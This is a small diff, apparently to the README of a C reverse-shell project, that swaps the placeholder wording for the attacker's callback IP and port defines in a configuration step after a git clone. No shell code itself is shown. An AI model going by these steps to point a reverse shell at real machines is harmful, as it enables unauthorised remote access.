@@ -25,8 +25,8 @@ git clone https://github.com/izenynn/c-reverse-shell.git
  /* ================================================== */
 -#define CLIENT_IP "0.0.0.0"
 -#define CLIENT_PORT (int)0
-+#define CLIENT_IP "[YOUR_PUBLIC_IP]"
-+#define CLIENT_PORT (int)[PORT_YOUR_ARE_LISTENING_TO]
++#define CLIENT_IP "XXX.XXX.XXX.XXX"
++#define CLIENT_PORT (int)XXXX
  /* ================================================== */
 ```
 
